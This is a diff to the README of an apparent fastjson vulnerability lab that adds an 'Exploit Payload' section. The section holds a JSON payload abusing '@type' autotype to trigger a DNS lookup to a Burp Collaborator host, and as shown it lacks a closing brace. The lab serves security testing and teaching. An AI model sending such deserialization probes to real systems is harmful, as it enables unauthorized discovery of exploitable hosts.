@@ -17,3 +17,14 @@ docker build --network=host --no-cache .
 
 Credits:
 https://github.com/vulhub/vulhub/tree/master/fastjson
+
+## Exploit Payload
+
+Use Following payload to receive DNS request from the vulnerable application.
+
+```
+{"test": {
+"@type":"java.net.Inet4Address",
+"val": "asdfasdfasdf.burpcollaborator.net"
+}
+```
